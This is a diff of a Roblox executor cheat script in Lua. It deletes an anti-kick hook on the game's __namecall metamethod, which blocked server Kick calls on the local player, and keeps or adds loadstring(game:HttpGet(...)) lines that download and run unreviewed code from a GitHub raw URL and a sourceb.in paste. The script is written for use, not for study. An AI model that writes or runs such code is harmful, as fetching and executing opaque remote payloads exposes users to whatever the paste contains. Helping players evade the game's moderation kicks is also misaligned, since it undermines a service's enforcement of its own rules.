@@ -1,20 +1,5 @@
-
-local getgenv, hookmetamethod, getnamecallmethod, newcclosure = getgenv, hookmetamethod, getnamecallmethod, newcclosure
-if getgenv().AntiKick_Enabled then
-    return
-end
-getgenv().AntiKick_Enabled = true
-local OldNamecall
-OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
-    local method = getnamecallmethod()
-    local args = {...}
-    if method == "Kick" and self == game.Players.LocalPlayer then
-        print("Mencoba kick terdeteksi dan diblokir!")
-        return nil
-    end
-    return OldNamecall(self, ...)
-end))
-
-print("Protection Aktif!")
+task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/UniversalScriptHub/rayfieldGuiSabMain/refs/heads/main/gui"))()
+end)
+task.wait(0.2)
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/wUh70bmexA/0"))()
